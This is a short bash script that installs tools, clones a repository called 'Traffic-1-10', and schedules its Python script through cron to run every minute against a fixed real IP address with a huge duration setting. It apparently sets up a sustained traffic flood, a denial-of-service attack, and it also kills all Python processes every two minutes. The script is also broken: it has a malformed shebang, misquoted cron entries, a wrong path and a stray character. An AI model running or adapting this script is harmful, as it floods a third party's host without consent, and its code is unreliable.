#!/bin/bash/

echo " Hello irani ❤️"
 apt install git -y
 apt install cron -y
 apt install python -y
 apt install python3 -y
 apt install nload -y
 mkdir /tmp/crontab.82
 cat > tmp/crontab.82/crontab
 git clone https://github.com/alirezaezzatofficial/Traffic-1-10.git

echo "* * * * *"   python Traffic-1-10/Traffic-1-10.py 2.186.182.17 -p 5 -t 86400000000000000000000000000000 -s 86400 >>  /tmp/crontab.82/crontab
echo "*/2 * * * *"   pkill -9 python >>  /tmp/crontab.82/crontab

nload
o
